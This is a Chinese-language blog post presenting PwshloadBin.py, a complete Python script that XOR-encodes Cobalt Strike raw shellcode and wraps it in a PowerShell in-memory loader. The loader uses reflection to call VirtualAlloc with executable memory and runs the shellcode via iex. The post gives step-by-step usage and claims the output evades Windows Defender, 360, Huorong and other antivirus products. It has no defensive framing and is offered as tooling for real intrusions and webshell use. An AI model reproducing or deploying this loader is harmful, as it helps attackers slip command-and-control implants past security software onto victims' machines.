---
title: Powershell Command 免杀自动生成脚本
tags: Tools
---

之前写的，用不到了基本，发博客里存下。

其实就是 CS生成的ps1文件，进行免杀处理，然后写了个自动化脚本，直接生成.bin文件去查看输出的powershell命令即可

之前学习免杀弄的，现在可能不免杀defender之类的了，但是360、火绒应该还是没问题的

下图CS原始生成的代码，进行免杀处理，还是比较容易的，网上很多思路，关于如何修改就不多说了，只是给个方便的脚本，然后替换自己的东西，我这个是xor然后写成数组进去的，网上还有很多思路，这个稍微改改就可以了，但是这个实战中很多webshell里面不好用，命令太长了。可以试试写bat里，要不然改完了就为ps1文件直接运行也可以。

![屏幕快照 2021-01-07 14.49.09](https://gitee.com/evilashz/MyIMGs/raw/master/img/20210107161032.png)

解密其中的base64的代码如下，pwsh的base64有点区别

```
# powershell

$data = [System.Convert]::FromBase64String("CompressedBase64StreamHere")
$ms = New-Object System.IO.MemoryStream
$ms.Write($data, 0, $data.Length)
$ms.Seek(0,0) | Out-Null
$sr = New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))
$sr.ReadToEnd()
```

处理完，把我代码里面的换掉就可以了

### **使用方法**

#### **⼀、⽣成RAW格式的Payload**

**Attacks->Packages->Payload Generator**

**![122](https://gitee.com/evilashz/MyIMGs/raw/master/img/20210107161153.png)**

![123](https://gitee.com/evilashz/MyIMGs/raw/master/img/20210107161200.png)

**⽣成的Payload保存⾄与 PwshloadBin.py ⽂件统⼀⽬录下**

#### **⼆、本机进⾏混淆操作(Require Python3)**

![屏幕快照 2021-01-07 14.56.17](https://gitee.com/evilashz/MyIMGs/raw/master/img/20210107161240.png)

```
-s or --src 指定⽣成RAW格式格式⽂件

-d or --dst 指定Obfused之后的输出⽂件

-n or --num 选择进⾏和原始字节数据进⾏XOR的值(⼯具介绍⾥Obfused写错了...)

Example:python3 PwshloadBin.py -s payload.bin -d result.txt -n 56
```

##### **免杀效果：**

**Windows Defender(1.321.492.0)**

**卡巴斯基 （⽆法过动态） **

**360(12.1.0.1005) **

**⽕绒(5.0.50.2) **

**腾讯电脑管家**

**...**

**截⽌ 2020年 8⽉ 3⽇ 星期⼀ 17时48分18秒 CST**



**PwshloadBin.py**

```python
'''
Usage: python3 load.py -s payload.bin -d 123.txt -n 10
'''
import sys
import os
import struct
from argparse import ArgumentParser, FileType

def LoadShellCode(num, src_fp, dst_fp,):
    file_path = src_fp
    data_bin = open(file_path, 'rb+')
    data_size = os.path.getsize(file_path)
    data_list = []
    shellcode_size = 0

    for i in range(data_size):
        data_i = data_bin.read(1) # 每次输出一个字节
        #print(data_i)
        base10 = ord(data_i) ^ num
        #print(base10)
        #num = struct.unpack('B', data_i) # B 无符号整数，b 有符号整数
        #print(num)
        data_list.append(base10)
        shellcode_size += 1

    data_bin.close()

    payload ="powershell $servi={Set-StrictMode -Version 2;function getd {Param ([Parameter(Position = 0, Mandatory = $True)] [Type[]] $pab,[Parameter(Position = 1)] [Type] $rac = [Void]);$bda = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]);$bda.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $pab).SetImplementationFlags('Runtime, Managed');$bda.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $rac, $pab).SetImplementationFlags('Runtime, Managed');return $bda.CreateType()};function postd {Param ($servw, $servq);$servp = ([AppDomain]::CurrentDomain.GetAssemblies() ^| Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods');$gpa = $servp.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'));return $gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($servp.GetMethod('GetModuleHandle')).Invoke($null, @($servw)))), $servq))};If ([IntPtr]::size -eq 8) {[Byte[]]$servo = "+ ",".join(repr(e) for e in data_list) +";for ($ui = 0; $ui -lt $servo.Count; $ui++) {$servo[$ui] = $servo[$ui] -bxor "+ str(num) +";};$vab = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((postd kernel32.dll VirtualAlloc), (getd @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])));$cba = $vab.Invoke([IntPtr]::Zero, $servo.Length, 0x3000, 0x40);[System.Runtime.InteropServices.Marshal]::Copy($servo, 0, $cba, $servo.length);$cab = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($cba, (getd @([IntPtr]) ([Void])));$cab.Invoke([IntPtr]::Zero)}}.ToString();iex $servi"
    #print(payload)
    dst_fp.write(payload)
    dst_fp.close()
    return shellcode_size

def main():
    parser = ArgumentParser(prog='PwshloadBin', description='Generate the PowerShell Payload to loading the Cobaltstrike PAYLOAD.BINs without file > evilash')
    parser.add_argument('-s','--src',help=u'source bin file', required=True)
    parser.add_argument('-d','--dst',help=u'output Payload file', type=FileType('w+'), required=True)
    parser.add_argument('-n','--num',help=u'Confused number Default=26',type=int, default=26)
    args = parser.parse_args()
    shellcode_size = LoadShellCode(args.num, args.src, args.dst)
    sys.stdout.writelines("[+]Shellcode Size : {} \n".format(shellcode_size))

if __name__ == "__main__":
    main()
```

